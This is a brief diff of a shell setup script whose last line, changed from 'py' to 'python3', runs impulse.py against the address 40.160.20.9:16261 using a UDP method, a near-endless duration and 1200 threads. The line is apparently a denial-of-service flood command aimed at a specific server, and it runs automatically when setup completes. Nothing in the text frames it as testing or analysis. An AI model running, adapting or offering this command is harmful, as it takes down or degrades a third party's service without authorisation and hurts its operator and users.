@@ -24,4 +24,4 @@ else
 fi
 
 echo "Setup complete. To run the script, use: python3 impulse.py [args]"
-py impulse.py --target 40.160.20.9:16261 --method UDP --time 99999999 --threads 1200
+python3 impulse.py --target 40.160.20.9:16261 --method UDP --time 99999999 --threads 1200
